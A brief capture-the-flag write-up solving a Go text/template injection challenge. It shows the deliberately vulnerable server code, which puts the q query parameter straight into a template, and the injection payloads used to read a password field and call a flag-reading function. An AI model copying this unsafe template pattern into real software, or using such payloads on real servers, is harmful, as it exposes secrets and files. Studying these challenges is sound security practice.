# Go Template
web challenge with go template injection

> Simple go page with templates
> http://52.78.16.36:35002

```go
package main
import (
    "fmt"
    "log"
    "net/http"
    "os"
    "text/template"
)

type User struct {
    ID       int
    Email    string
    Password string
    GetFlag  func(a int) string
}

func main() {
    user1 := User{1, "user@go-template.com", "gopass", func(a int) string {
        data, err := os.ReadFile("flag")
        if err != nil {
            log.Panic(err)
        }
        return string(data)
    }}

    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        var tmpl = fmt.Sprintf(`
      <html>
      <head>
      <title>go template</title>
      </head>
      <h1>can you exploit it?</h1>
      <p>%s</p>
      </html>`,
            r.URL.Query()["q"])
        t := template.Must(template.New("page").Parse(tmpl))
        err := t.Execute(w, user1)
        if err != nil {
            fmt.Println(err)
        }
    })
    http.ListenAndServe(":3000", nil)
}
```

We notice that the `q` query allows for template injection, e.g. `http://52.78.16.36:35002/?q={{7*7}}`

We also notice that the template is being executed with the `user1` object, so we can get the `user1` properties with `http://52.78.16.36:35002/?q={{.Password}}`

so we use the `call` thingy (this took like 6 hours of digging the web over 2 days) to do `http://52.78.16.36:35002/?q={{call .GetFlag 1}}` and it gives us the flag